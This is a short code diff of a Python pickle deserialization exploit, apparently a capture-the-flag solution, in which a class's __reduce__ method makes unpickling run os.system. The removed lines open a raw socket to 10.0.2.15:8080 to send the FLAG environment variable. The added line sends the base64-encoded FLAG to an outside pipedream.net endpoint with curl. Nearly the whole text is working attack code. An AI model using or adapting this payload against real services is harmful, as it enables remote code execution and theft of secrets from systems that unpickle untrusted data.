@@ -12,14 +12,9 @@ import pickle
 import os
 import urllib
 import base64
-pp = 'python -c '
-scr = ''''import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.2.15", 8080));import os;s.send("HERE{}".format(os.environ.get("FLAG")));data = s.recv(1024)' '''
-print pp+scr
 class genpoc(object):
     def __reduce__(self):
-        def sol():
-            return os.environ.get("FLAG")
-        return os.system, (pp+scr,) 
+        return os.system, ("curl https://enkmqp4uzg3jfmu.m.pipedream.net -d \"$(echo $FLAG| base64) \"",) 
 
 e = genpoc()
 poc = pickle.dumps(e)
